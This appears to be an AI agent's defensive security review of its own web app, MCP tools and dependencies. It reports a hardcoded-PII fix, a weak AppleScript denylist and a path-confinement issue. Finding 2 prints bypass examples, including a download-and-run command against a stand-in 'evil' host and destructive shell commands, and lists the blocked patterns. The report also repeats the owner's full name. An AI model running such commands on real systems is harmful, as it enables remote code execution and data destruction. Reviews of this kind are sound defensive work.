# Security Review — T-09 (Copilot security agent)

OWASP-style manual pass over `web-ui/app/api/*`, `mark-l-bridge/server.py`,
and `mcp/`, plus `npm audit` at root and in `web-ui`. Defensive review only —
no exploitation attempted, own code only.

## Summary

| # | Severity | Location | Finding | Status |
|---|----------|----------|---------|--------|
| 1 | High | `web-ui/app/api/jarvis/biometrics/route.ts` | Owner PII (full name + date of birth) hardcoded in source as the "identity challenge" answer key | **Fixed** — moved to `OWNER_FULL_NAME`/`OWNER_DOB` env vars (documented in `.env.example`), feature now returns `not_configured` when unset |
| 2 | Medium | `web-ui/lib/apple-automation.js` (`validateAppleScript`) | Denylist-based blocklist for AI-generated AppleScript passed to `osascript`; blocks a few destructive patterns (`rm -rf`, `sudo`, `curl\|sh`, ...) but a denylist is inherently bypassable (e.g. `do shell script "curl -o /tmp/x && bash /tmp/x"`, `chmod`, `launchctl`, `pkill`, base64-wrapped commands, alternate `rm` flags) | Documented, not auto-fixed |
| 3 | Low | `mcp/tools/health.js` (`resolveProjectPath`) | Accepts any `projectPath` and resolves it without confining to a workspace root, so the `health_check` MCP tool can run `npm audit`/read `package.json` anywhere on disk the process can reach | Documented, not auto-fixed |
| 4 | Info | root `npm audit`, `web-ui` `npm audit` | 0 vulnerabilities (info/low/moderate/high/critical) at scan time | No action needed |
| 5 | Info | XSS / `dangerouslySetInnerHTML` | No occurrences of `dangerouslySetInnerHTML` found in `web-ui`; `dompurify` appears only in `package-lock.json` (transitive), not imported anywhere — no raw HTML-from-API rendering path was found | No action needed |
| 6 | Info | Auth/webhook code | `web-ui/app/api/auth/route.ts` and `webhook/route.ts` already use `crypto.timingSafeEqual` for PIN/password and GitHub HMAC signature comparisons; `web-ui/app/api/files/route.ts` already confines reads/writes to the user's home directory via `path.resolve` + prefix check | No action needed |

> Note: a related access-control bug (the `workflow` tool / `/workflows` nav
> route mapped to a non-existent `workflows` permission, found by the same
> `test/security-utils.test.js` this review exercised) was fixed by the QA
> agent in `ea25d75` (board: T-08) while this review was in progress —
> `tool-permissions.ts`/`title-profiles.ts` now correctly point at the real
> `n8n` permission key, so no duplicate fix was needed here. The
> `lib/ratelimit.ts` cleanup timer missing `.unref()` (same test file, same
> root cause class) was independently fixed by both agents and reconciled
> during rebase.

## Details

### 1. Hardcoded owner PII used as an "identity" factor (fixed)

`api/jarvis/biometrics/route.ts`'s `identity-challenge` action compared the
caller's answer against a literal name (`"Hisham Abulfeilat"`) and several
date-of-birth phrasings of `REDACTED`, committed directly in source. Two
problems:

- **Privacy**: a specific person's full name and date of birth were
  permanently recorded in git history for this (public-facing) repo.
- **Weak auth factor**: because the accepted answers were visible in source,
  this "challenge" verified nothing an attacker with repo access didn't
  already know; DOB is also commonly used as a recovery factor elsewhere
  (banks, ID lookups), so leaking it is higher-impact than a typical secret.

**Fix applied**: the two accepted-answer literals were replaced with
`getOwnerIdentity()`, which reads `OWNER_FULL_NAME` / `OWNER_DOB` from the
environment (documented as blank placeholders in `.env.example`, meant for a
gitignored `.env.local`). If unset, the endpoint now returns
`{ verified: false, reason: 'not_configured' }` (HTTP 503) instead of ever
exposing or checking against literal PII. `ownerName` in the stored biometric
metadata is now derived the same way instead of the literal string.

This endpoint is already behind `isAuthorizedRequest` (a valid session is
required before the challenge even runs), so no new exposure is introduced;
the fix only removes the hardcoded PII and makes the feature a no-op until an
operator opts in via their own `.env.local`.

### 2. AppleScript validation denylist (not auto-fixed)

`api/mac-control/route.ts` lets an authenticated user (permission:
`mac_control`, macOS only) send natural language that an LLM turns into
AppleScript, or submit a script directly. Before running it with `osascript`,
`validateAppleScript()` rejects a short list of regex patterns
(`rm -rf`, `sudo`, `shutdown`/`reboot`, `mkfs`, `diskutil erase`, `dd if=`,
`csrutil disable`, a `curl|wget … | sh/bash` pipeline, and
`delete every` in System Events).

This is a blocklist, not an allowlist, so it can be bypassed by any
destructive shell invocation that doesn't match those exact patterns, e.g.:

```applescript
do shell script "curl -s https://evil/x -o /tmp/x.sh && bash /tmp/x.sh"
do shell script "chmod -R 777 /Users"
do shell script "launchctl unload com.apple.something"
do shell script "pkill -9 -f ssh"
```

**Why not auto-fixed here**: closing this properly requires a design change
(e.g. an allowlist of safe verb/phrase templates, or dropping `do shell
script` support entirely and only allowing the small set of
`knownAppleScript()` templates), which would change behavior/break the
"free-form AI-generated automation" feature this endpoint exists for. That's
a product decision, not a drop-in patch, so it's recorded here instead of
guessed at. Mitigating factors already in place: requires auth +
`mac_control` permission, macOS-only, 10–20s `exec` timeouts, and scripts are
run from a randomly-named temp file (no injection via the temp path itself).

**Suggested follow-up** (needs product sign-off): replace the denylist with
an allowlist of script templates, or require explicit user confirmation
(surfaced diff of the generated script) before any `do shell script` call is
executed.

### 3. MCP `health_check` tool path confinement (not auto-fixed)

`mcp/tools/health.js`'s `resolveProjectPath(projectPath)` does
`resolve(projectPath || '.')` with no check that the result stays under a
workspace root, so a caller of the MCP tool can point `health_check` at any
absolute path reachable by the process (e.g. `../../etc` equivalents,
though it only ever reads `package.json` and shells out to `npm audit`, not
arbitrary file contents).

**Why not auto-fixed here**: the MCP server is a local, trusted-caller tool
(it's wired into this repo's own agent tooling per `mcp/index.js`), so
"caller can point it at another directory on the same machine" is expected
day-to-day usage (auditing sibling projects), not a clear vulnerability in
this context. Constraining it to a single workspace root would break that
legitimate use without a corresponding threat model change, so it's flagged
here for awareness rather than patched. If the MCP server is ever exposed to
untrusted/remote callers, this should be revisited (confine to an allowed
roots list).

## npm audit results

- Root (`npm audit --json`): 0 vulnerabilities, 3 total dependencies.
- `web-ui` (`npm audit --json`): 0 vulnerabilities, 495 total dependencies.

No fixable advisories were found in either at scan time.
